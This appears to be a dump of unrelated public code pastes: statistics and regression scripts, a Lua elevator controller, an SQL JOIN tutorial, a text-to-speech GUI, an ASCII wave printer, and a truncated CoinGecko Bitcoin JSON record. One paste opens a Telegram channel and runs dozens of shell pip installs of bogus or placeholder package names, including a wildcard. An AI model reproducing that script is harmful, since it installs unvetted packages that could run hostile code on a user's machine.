BdTRUybW,numpy Semi main (1/4/24),brandblox,Python,Sunday 31st of March 2024 11:21:56 PM CDT,"# Function to calculate mean
def calculate_mean(data):
    return sum(data) / len(data)

# Function to calculate median
def calculate_median(data):
    sorted_data = sorted(data)
    n = len(sorted_data)
    if n % 2 == 0:
        return (sorted_data[n // 2 - 1] + sorted_data[n // 2]) / 2
    else:
        return sorted_data[n // 2]

# Function to calculate mode
def calculate_mode(data):
    frequency = {}
    for value in data:
        frequency[value] = frequency.get(value, 0) + 1

    max_frequency = max(frequency.values())
    mode = [key for key, val in frequency.items() if val == max_frequency]
    return mode

# User input for data
data = []
while True:
    value = input(""Enter a number (or 'done' to finish): "")
    if value.lower() == 'done':
        break
    data.append(int(value))

# Calculate mean
mean = calculate_mean(data)
print(""Mean:"", mean)

# Calculate median
median = calculate_median(data)
print(""Median:"", median)

# Calculate mode
mode = calculate_mode(data)
print(""Mode:"", mode)





#Liner regression
import numpy as np
from sklearn.linear_model import LinearRegression

years = np.array([[1], [2], [3], [4], [5]])
speeds = np.array([30, 45, 45, 55, 65])  


model = LinearRegression()
model.fit(years, speeds)

x= 15
predicted_speed = model.predict([[x]])

print(f""Predicted speed after {x} years:"", predicted_speed[0], ""km/h"")
"
gY0Dx4pJ,server.lua,opencomputerstest2,Lua,Sunday 31st of March 2024 11:09:36 PM CDT,"local monitors = {}
local floors
do
    local h = fs.open(""config.txt"", ""r"")
    local config = textutils.unserialize(h.readAll())
    h.close()
    for _, v in ipairs(config.monitors) do
        monitors[v] = true
    end
    floors = config.floors
end

local function layoutMonitor(mon)
    local monData = {}
    local w, h = mon.getSize()
    local x, y = 1, 1
    for _, f in ipairs(floors) do
        local s = tostring(f)
        if #s > w then
            return false, ""WIDTH""
        elseif #s > w - x + 1 then
            x = 1
            y = y + 1
            if y > h then
                return false, ""SIZE""
            end
        end
        table.insert(monData, {
            x = x,
            y = y,
            len = #s,
            text = s,
            floor = f
        })
        x = x + #s + 1
    end
    return true, monData
end

local targetFloor
local currentFloor

local function redrawButtons(self, mon)
    mon.setBackgroundColor(colors.black)
    mon.setTextColor(colors.yellow)
    mon.setCursorPos(1, 1)
    mon.clear()
    for _, ent in ipairs(self.buttons) do
        mon.setCursorPos(ent.x, ent.y)
        if ent.floor == currentFloor then
            mon.setTextColor(colors.red)
            mon.write(ent.text)
            mon.setTextColor(colors.yellow)
        else
            mon.write(ent.text)
        end
    end
end

local function redrawError(self, mon)
    mon.setBackgroundColor(colors.red)
    mon.setTextColor(colors.black)
    mon.setCursorPos(1, 1)
    mon.clear()
    mon.write(self.err)
end

local updateFloorTravel
local function onClickButtons(self, x, y)
    if not currentFloor then
        return
    end
    for _, v in ipairs(self.buttons) do
        if v.y == y and
           v.x <= x and
           v.x + v.len > x then
            targetFloor = v.floor
            updateFloorTravel()
        end
    end
end

local function noop() end

for mon in pairs(monitors) do
    local mon = peripheral.wrap(mon)
    local ok, v = layoutMonitor(mon)
    if ok then
        monitors[mon] = {
            buttons = v,
            redraw = redrawButtons,
            onClick = onClickButtons
        }
    else
        monitors[mon] = {
            err = v,
            redraw = redrawError,
            onClick = noop
        }
    end
    monitors[mon]:redraw(mon)
end

local CHANNEL_ID = 4242
local modem = peripheral.find(""modem"", function(_, m) return not m.isWireless() end) or error(""Could not find modem"", 0)
modem.open(CHANNEL_ID)

local function sendReq(req)
    modem.transmit(CHANNEL_ID, 0, {
        type = ""elevator"",
        req = req
    })
end

updateFloorTravel = function()
    if targetFloor then
        if currentFloor < targetFloor then
            sendReq(""up"")
        elseif currentFloor > targetFloor then
            sendReq(""down"")
        else
            targetFloor = nil
        end
    end
end

local pongTimer = os.startTimer(0)

while true do
    local e = {os.pullEvent()}
    if e[1] == ""monitor_touch"" then
        local mon = monitors[e[2]]
        if mon then
            mon:onClick(e[3], e[4])
        end
    elseif e[1] == ""monitor_resize"" then
        if monitors[e[2]] then
            monitors[e[2]]:redraw(peripheral.wrap(e[2]), nil)
        end
    elseif e[1] == ""modem_message"" then
        if e[3] == CHANNEL_ID then
            local msg = e[5]
            if type(msg) == ""table"" and
               msg.type == ""elevator"" then
                if msg.req == ""ping"" then
                    if pongTimer then
                        os.cancelTimer(pongTimer)
                        pongTimer = nil
                    end
                    currentFloor = msg.floor
                    for n, m in pairs(monitors) do
                        m:redraw(peripheral.wrap(n))
                    end
                    updateFloorTravel()
                end
            end
        end
    elseif e[1] == ""timer"" then
        if e[2] == pongTimer then
            sendReq(""pong"")
            pongTimer = os.startTimer(1.5)
        end
    end
end
"
anQUHHg3,SQL - Introduction to JOIN and UNION Script by HadiMaster,hadimaster65555,PostgreSQL,Sunday 31st of March 2024 10:59:09 PM CDT,"-- Create table for Employees
CREATE TABLE Employees (
    EmployeeID INT PRIMARY KEY,
    FirstName VARCHAR(50),
    LastName VARCHAR(50),
    DepartmentID INT
);

-- Populate Employees table with sample data
INSERT INTO Employees (EmployeeID, FirstName, LastName, DepartmentID)
VALUES
    (1, 'John', 'Smith', 101),
    (2, 'Jane', 'Doe', 102),
    (3, 'Michael', 'Johnson', 101),
    (4, 'Emily', 'Brown', 103),
    (5, 'David', 'Davis', 102),
    (6, 'Sarah', 'Wilson', 103),
    (7, 'James', 'Jones', 101),
    (8, 'Jennifer', 'Lee', 103),
    (9, 'Christopher', 'Anderson', 102),
    (10, 'Amanda', 'Martinez', 101),
    (11, 'Matthew', 'Taylor', 103),
    (12, 'Ashley', 'White', 102),
    (13, 'Ryan', 'Jackson', 101),
    (14, 'Jessica', 'Harris', 103),
    (15, 'Daniel', 'Thompson', 102),
    (16, 'Melissa', 'Clark', 101),
    (17, 'Kevin', 'Thomas', 103),
    (18, 'Elizabeth', 'Lewis', 102),
    (19, 'Eric', 'Walker', 101),
    (20, 'Samantha', 'Hall', 103);

-- Create table for Departments
CREATE TABLE Departments (
    DepartmentID INT PRIMARY KEY,
    DepartmentName VARCHAR(50)
);

-- Populate Departments table with sample data
INSERT INTO Departments (DepartmentID, DepartmentName)
VALUES
    (101, 'HR'),
    (102, 'Finance'),
    (103, 'Marketing'),
    (104, 'IT'),
    (105, 'Operations'),
    (106, 'Sales'),
    (107, 'Research'),
    (108, 'Customer Service'),
    (109, 'Legal'),
    (110, 'Administration');

-- Create table for Orders
CREATE TABLE Orders (
    OrderID INT PRIMARY KEY,
    CustomerID INT,
    OrderDate DATE,
    TotalAmount DECIMAL(10, 2)
);

-- Populate Orders table with sample data
INSERT INTO Orders (OrderID, CustomerID, OrderDate, TotalAmount)
VALUES
    (1, 101, '2023-01-01', 1000),
    (2, 102, '2023-01-02', 1500),
    (3, 103, '2023-01-03', 2000),
    (4, 104, '2023-01-04', 1200),
    (5, 105, '2023-01-05', 1800),
    (6, 106, '2023-01-06', 900),
    (7, 107, '2023-01-07', 1300),
    (8, 108, '2023-01-08', 1750),
    (9, 109, '2023-01-09', 1100),
    (10, 110, '2023-01-10', 1600),
    (11, 101, '2023-01-11', 1400),
    (12, 102, '2023-01-12', 1900),
    (13, 103, '2023-01-13', 2200),
    (14, 104, '2023-01-14', 1350),
    (15, 105, '2023-01-15', 1950),
    (16, 106, '2023-01-16', 950),
    (17, 107, '2023-01-17', 1200),
    (18, 108, '2023-01-18', 1650),
    (19, 109, '2023-01-19', 1000),
    (20, 110, '2023-01-20', 1500);

-- INNER JOIN
SELECT Employees.FirstName, Employees.LastName, Departments.DepartmentName
FROM Employees
INNER JOIN Departments ON Employees.DepartmentID = Departments.DepartmentID;

-- LEFT JOIN
SELECT Employees.FirstName, Employees.LastName, Departments.DepartmentName
FROM Employees
LEFT JOIN Departments ON Employees.DepartmentID = Departments.DepartmentID;

-- RIGHT JOIN
SELECT Employees.FirstName, Employees.LastName, Departments.DepartmentName
FROM Employees
RIGHT JOIN Departments ON Employees.DepartmentID = Departments.DepartmentID;

-- FULL JOIN
SELECT Employees.FirstName, Employees.LastName, Departments.DepartmentName
FROM Employees
FULL JOIN Departments ON Employees.DepartmentID = Departments.DepartmentID;

-- SEMI JOIN
SELECT Employees.FirstName, Employees.LastName
FROM Employees
WHERE EXISTS (
    SELECT 1
    FROM Departments
    WHERE Employees.DepartmentID = Departments.DepartmentID
);

-- ANTI JOIN
SELECT Employees.FirstName, Employees.LastName
FROM Employees
WHERE NOT EXISTS (
    SELECT 1
    FROM Departments
    WHERE Employees.DepartmentID = Departments.DepartmentID
);

-- UNION and UNION ALL

-- UNION
SELECT OrderID, CustomerID, OrderDate, TotalAmount
FROM Orders
WHERE TotalAmount > 1500

UNION

SELECT OrderID, CustomerID, OrderDate, TotalAmount
FROM Orders
WHERE OrderDate > '2023-01-10';

-- UNION ALL
SELECT OrderID, CustomerID, OrderDate, TotalAmount
FROM Orders
WHERE TotalAmount > 1500

UNION ALL

SELECT OrderID, CustomerID, OrderDate, TotalAmount
FROM Orders
WHERE OrderDate > '2023-01-10';
"
xrneEgPB,Conversor de texto para MP3,MizunoBrasil,Python,Sunday 31st of March 2024 10:39:12 PM CDT,"import tkinter as tk
from tkinter import simpledialog, filedialog, messagebox
from gtts import gTTS

def converter_para_audio():
    texto = caixa_texto.get(""1.0"", ""end-1c"")
    caminho_arquivo = filedialog.asksaveasfilename(defaultextension="".mp3"",
                                                   filetypes=[(""Arquivos MP3"", ""*.mp3"")])

    if caminho_arquivo:
        tts = gTTS(text=texto, lang='pt')
        tts.save(caminho_arquivo)
        messagebox.showinfo(""Conversão Concluída"", ""O áudio foi gerado com sucesso!\n\nPrograma criado por Mizuno. 2024"")

# Configura a janela principal
janela = tk.Tk()
janela.title(""Conversor de Texto para áudio MP3"")

# Calcula posição x e y para centralizar a janela
largura_janela = 800
altura_janela = 600
posicao_x = int(janela.winfo_screenwidth()/2 - largura_janela/2)
posicao_y = int(janela.winfo_screenheight()/2 - altura_janela/2)
janela.geometry(f""{largura_janela}x{altura_janela}+{posicao_x}+{posicao_y}"")

# Caixa de texto para inserção do texto pelo usuário
caixa_texto = tk.Text(janela, height=15, width=50)
caixa_texto.pack(pady=20)

# Botão para iniciar a conversão
botao_converter = tk.Button(janela, text=""Converter para Áudio"", command=converter_para_audio)
botao_converter.pack(pady=20)

# Inicia a interface gráfica
janela.mainloop()
"
a2dm8Saw,Square Wave Pattern,CodingComputing,Python,Sunday 31st of March 2024 10:21:19 PM CDT,"# *Square Wave Pattern* by @CodingComputing

# Parameters
num_cycles = 3  # How many repeating cycles are present?
high_width = 2  # How long is the wave high in each cycle?
low_before_width = 1  # Before the wave moves up to high, how long is it low?
low_after_width = 1  # After the wave moves down from high, how long is it low?
height = 4  # How high does the wave go?

# Develop Column-wise representation
# L for Low, H for High, T for Transition
single_cycle_col_repr = 'L'*low_before_width + 'T' + 'H'*high_width + 'T' + 'L'*low_after_width
full_col_repr = single_cycle_col_repr * num_cycles

# Form each row and draw!
for row_idx in range(height):
    if row_idx == 0:  # Top row. '*' comes for H or T type columns
        row_items = [(' ' if c=='L' else '*') for c in full_col_repr]
    elif row_idx == height-1:  # Bottom row. '*' comes for L or T type columns
        row_items = [(' ' if c=='H' else '*') for c in full_col_repr]
    else:  # Middle row. '*' comes only T type columns
        row_items = [('*' if c=='T' else ' ') for c in full_col_repr]
    print(''.join(row_items))  # Output the row

# Output:
#  ****  ****  **** 
#  *  *  *  *  *  * 
#  *  *  *  *  *  * 
# **  ****  ****  **
"
etkGewj3,python modules install,fheed888,Python,Sunday 31st of March 2024 09:59:08 PM CDT,"import os
import webbrowser
print('اشترك ليتم بدء التنزيل')
webbrowser.open('https://t.me/lldd88')
print('بدء التنزيل + شكراً على الاشتراك')
os.system('pip install selenium')
os.system('pip install requests')
os.system('pip install pyfiglet')
os.system('pip install sys')
os.system('pip install py_compile')
os.system('pip install youtube_dl')
os.system('pip install uuid')
os.system('pip install time')
os.system('pip install os')
os.system('pip install random')
os.system('pip install datetime')
os.system('pip install string')
os.system('pip install secrets')
os.system('pip install webbrowser')
os.system('pip install hashlib')
os.system('pip install colorama')
os.system('pip install n')
os.system('pip install mm')
os.system('pip install new')
os.system('pip install sleep')
os.system('pip install BeautifulSoup')
os.system('pip install new')
os.system('pip install pafy')
os.system('pip install bs4')
os.system('pip install sys')
os.system('pip install json')
os.system('pip install random')
os.system('pip install uuid')
os.system('pip install secrets')
os.system('pip install datetime')
os.system('pip install argparse')
os.system('pip install InstagramAPI')
os.system('pip install sleep')
os.system('pip install string')
os.system('pip install uuid4')
os.system('pip install generate_user_agent')
os.system('pip install threading')
os.system('pip install json')
os.system('pip install datetime')
os.system('pip install token_hex')
os.system('pip install secrets')
os.system('pip install token_hex')
os.system('pip install Fore')
os.system('pip install secrets')
os.system('pip install uuid')
os.system('pip install re')
os.system('pip install b')
os.system('pip install requests')
os.system('pip install pyfiglet')
os.system('pip install sys')
os.system('pip install py_compile')
os.system('pip install youtube_dl')
os.system('pip install uuid')
os.system('pip install time')
os.system('pip install os')
os.system('pip install random')
os.system('pip install datetime')
os.system('pip install string')
os.system('pip install secrets')
os.system('pip install webbrowser')
os.system('pip install hashlib')
os.system('pip install colorama')
os.system('pip install n')
os.system('pip install mm')
os.system('pip install new')
os.system('pip install sleep')
os.system('pip install BeautifulSoup')
os.system('pip install new')
os.system('pip install pafy')
os.system('pip install bs4')
os.system('pip install sys')
os.system('pip install json')
os.system('pip install random')
os.system('pip install uuid')
os.system('pip install secrets')
os.system('pip install datetime')
os.system('pip install *')
os.system('pip install argparse')
os.system('pip install InstagramAPI')
os.system('pip install sleep')
os.system('pip install string')
os.system('pip install uuid4')
os.system('pip install generate_user_agent')
os.system('pip install threading')
os.system('pip install json')
os.system('pip install datetime')
os.system('pip install token_hex')
os.system('pip install secrets')
os.system('pip install token_hex')
os.system('pip install Fore')
os.system('pip install secrets')
os.system('pip install uuid')
os.system('pip install re')
os.system('pip install b')
os.system('cls' if os.name == 'nt' else 'clear') 
print('تم تحميل جميع مكاتب بايثون ')"
2DrMVBk3,Coin Gecko Coins Detail Format,rizkiandrianto,JSON,Sunday 31st of March 2024 09:29:34 PM CDT,"{
    ""id"": ""bitcoin"",
    ""symbol"": ""btc"",
    ""name"": ""Bitcoin"",
    ""web_slug"": ""bitcoin"",
    ""asset_platform_id"": null,
    ""platforms"": {
        """": """"
    },
    ""detail_platforms"": {
        """": {
            ""decimal_place"": null,
            ""contract_address"": """"
        }
    },
    ""block_time_in_minutes"": 10,
    ""hashing_algorithm"": ""SHA-256"",
    ""categories"": [
        ""Proof of Work (PoW)"",
        ""FTX Holdings"",
        ""Layer 1 (L1)"",
        ""Cryptocurrency""
    ],
    ""preview_listing"": false,
    ""public_notice"": null,
    ""additional_notices"": [],
    ""localization"": {
        ""en"": ""Bitcoin"",
        ""de"": ""Bitcoin"",
        ""es"": ""Bitcoin"",
        ""fr"": ""Bitcoin"",
        ""it"": ""Bitcoin"",
        ""pl"": ""Bitcoin"",
        ""ro"": ""Bitcoin"",
        ""hu"": ""Bitcoin"",
        ""nl"": ""Bitcoin"",
        ""pt"": ""Bitcoin"",
        ""sv"": ""Bitcoin"",
        ""vi"": ""Bitcoin"",
        ""tr"": ""Bitcoin"",
        ""ru"": ""Биткоин"",
        ""ja"": ""ビットコイン"",
        ""zh"": ""比特币"",
        ""zh-tw"": ""比特幣"",
        ""ko"": ""비트코인"",
        ""ar"": ""بيتكوين"",
        ""th"": ""บิตคอยน์"",
        ""id"": ""Bitcoin"",
        ""cs"": ""Bitcoin"",
        ""da"": ""Bitcoin"",
        ""el"": ""Bitcoin"",
        ""hi"": ""Bitcoin"",
        ""no"": ""Bitcoin"",
        ""sk"": ""Bitcoin"",
        ""uk"": ""Bitcoin"",
        ""he"": ""Bitcoin"",
        ""fi"": ""Bitcoin"",
        ""bg"": ""Bitcoin"",
        ""hr"": ""Bitcoin"",
        ""lt"": ""Bitcoin"",
        ""sl"": ""Bitcoin""
    },
    ""description"": {
        ""en"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""de"": """",
        ""es"": """",
        ""fr"": """",
        ""it"": """",
        ""pl"": """",
        ""ro"": """",
        ""hu"": """",
        ""nl"": """",
        ""pt"": """",
        ""sv"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""vi"": """",
        ""tr"": """",
        ""ru"": """",
        ""ja"": """",
        ""zh"": """",
        ""zh-tw"": """",
        ""ko"": ""비트코인은 2009년 나카모토 사토시가 만든 디지털 통화로, 통화를 발행하고 관리하는 중앙 장치가 존재하지 않는 구조를 가지고 있다. 대신, 비트코인의 거래는 P2P 기반 분산 데이터베이스에 의해 이루어지며, 공개 키 암호 방식 기반으로 거래를 수행한다. 비트코인은 공개성을 가지고 있다. 비트코인은 지갑 파일의 형태로 저장되며, 이 지갑에는 각각의 고유 주소가 부여되며, 그 주소를 기반으로 비트코인의 거래가 이루어진다. 비트코인은 1998년 웨이따이가 사이버펑크 메일링 리스트에 올린 암호통화란 구상을 최초로 구현한 것 중의 하나이다.\r\n\r\n비트코인은 최초로 구현된 가상화폐입니다. 발행 및 유통을 관리하는 중앙권력이나 중간상인 없이, P2P 네트워크 기술을 이용하여 네트워크에 참여하는 사용자들이 주체적으로 화폐를 발행하고 이체내용을 공동으로 관리합니다. 이를 가능하게 한 블록체인 기술을 처음으로 코인에 도입한 것이 바로 비트코인입니다.\r\n\r\n비트코인을 사용하는 개인과 사업자의 수는 꾸준히 증가하고 있으며, 여기에는 식당, 아파트, 법률사무소, 온라인 서비스를 비롯한 소매상들이 포함됩니다. 비트코인은 새로운 사회 현상이지만 아주 빠르게 성장하고 있습니다. 이를 바탕으로 가치 증대는 물론, 매일 수백만 달러의 비트코인이 교환되고 있습니다. \r\n\r\n비트코인은 가상화폐 시장에서 현재 유통시가총액과 코인의 가치가 가장 크고, 거래량 또한 안정적입니다. 이더리움이 빠르게 추격하고 있지만 아직은 가장 견고한 가상화폐라고 볼 수 있습니다. \r\n\r\n코인 특징\r\n1. 중앙주체 없이 사용자들에 의해 거래내용이 관리될 수 있는 비트코인의 운영 시스템은 블록체인 기술에서 기인합니다. 블록체인은 쉽게 말해 다 같이 장부를 공유하고, 항상 서로의 컴퓨터에 있는 장부 파일을 비교함으로써 같은 내용만 인정하는 방식으로 운영됩니다. 따라서 전통적인 금융기관에서 장부에 대한 접근을 튼튼하게 방어하던 것과는 정반대의 작업을 통해 보안을 달성합니다. 장부를 해킹하려면 51%의 장부를 동시에 조작해야 하는데, 이는 사실상 불가능합니다. 왜냐하면, 이를 실행하기 위해서는 컴퓨팅 파워가 어마어마하게 소요되고, 이것이 가능한 슈퍼컴퓨터는 세상에 존재하지 않기 때문입니다. 또한, 장부의 자료들은 줄글로 기록되는 것이 아니라 암호화 해시 함수형태로 블록에 저장되고, 이 블록들은 서로 연결되어 있어서 더 강력한 보안을 제공합니다. \r\n\r\n2. 비트코인은 블록발행보상을 채굴자에게 지급하는 방식으로 신규 코인을 발행합니다. 블록발행보상은 매 21만 블록(약 4년)을 기준으로 발행량이 절반으로 줄어듭니다. 처음에는 50비트코인씩 발행이 되었고, 4년마다 계속 반으로 감소하고 있습니다. 코인의 총량이 2,100만 개에 도달하면 신규 발행은 종료되고, 이후에는 거래 수수료만을 통해 시스템이 지탱될 것입니다. \r\n\r\n핵심 가치\r\n(키워드: 통화로 사용될 수 있는 보편성 및 편의성)\r\n\r\n1. 다양한 알트코인들의 등장에 앞서 비트코인은 가상화폐 시장에서 독보적이었기 때문에, 현재 가장 보편적인 결제수단으로 사용됩니다. 실생활에서 이를 활용할 수 있는 가맹점이 알트코인들보다 압도적으로 많을 뿐만 아니라, 이 또한 증가하고 있습니다. 일례로 일본 업체들이 비트코인 결제 시스템을 도입하면서 곧 비트코인을 오프라인 점포 26만 곳에서 이용할 수 있게 될 것입니다. \r\n\r\n2. 여러 나라에서 비트코인을 정식 결제 수단으로 인정하면서, 실물화폐와 가상화폐를 거래할 때 더는 부가가치세가 부과되지 않게 된다고 합니다. 실제로 일본과 호주에서는 이미 비트코인을 합법적 결제 수단으로 인정하면서 제도권 안으로 들여오고 있고, 미국에서는 비트코인 ETF 승인 노력도 진행되고 있습니다. 각국에 비트코인을 기반으로 한 ATM 기계도 설치되었다고 합니다. "",
        ""ar"": """",
        ""th"": """",
        ""id"": """",
        ""cs"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""da"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""el"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a href=\""https://www.coingecko.com/buzz/ethereum-still-king-dapps-cryptokitties-need-1-billion-on-eos\"">CryptoKitties</a>."",
        ""hi"": ""Bitcoin is the first successful internet money based on peer-to-peer technology; whereby no central bank or authority is involved in the transaction and production of the Bitcoin currency. It was created by an anonymous individual/group under the name, Satoshi Nakamoto. The source code is available publicly as an open source project, anybody can look at it and be part of the developmental process.\r\n\r\nBitcoin is changing the way we see money as we speak. The idea was to produce a means of exchange, independent of any central authority, that could be transferred electronically in a secure, verifiable and immutable way. It is a decentralized peer-to-peer internet currency making mobile payment easy, very low transaction fees, protects your identity, and it works anywhere all the time with no central authority and banks.\r\n\r\nBitcoin is designed to have only 21 million BTC ever created, thus making it a deflationary currency. Bitcoin uses the <a href=\""https://www.coingecko.com/en?hashing_algorithm=SHA-256\"">SHA-256</a> hashing algorithm with an average transaction confirmation time of 10 minutes. Miners today are mining Bitcoin using ASIC chip dedicated to only mining Bitcoin, and the hash rate has shot up to peta hashes.\r\n\r\nBeing the first successful online cryptography currency, Bitcoin has inspired other alternative currencies such as <a href=\""https://www.coingecko.com/en/coins/litecoin\"">Litecoin</a>, <a href=\""https://www.coingecko.com/en/coins/peercoin\"">Peercoin</a>, <a href=\""https://www.coingecko.com/en/coins/primecoin\"">Primecoin</a>, and so on.\r\n\r\nThe cryptocurrency then took off with the innovation of the turing-complete smart contract by <a href=\""https://www.coingecko.com/en/coins/ethereum\"">Ethereum</a> which led to the development of other amazing projects such as <a href=\""https://www.coingecko.com/en/coins/eos\"">EOS</a>, <a href=\""https://www.coingecko.com/en/coins/tron\"">Tron</a>, and even crypto-collectibles such as <a 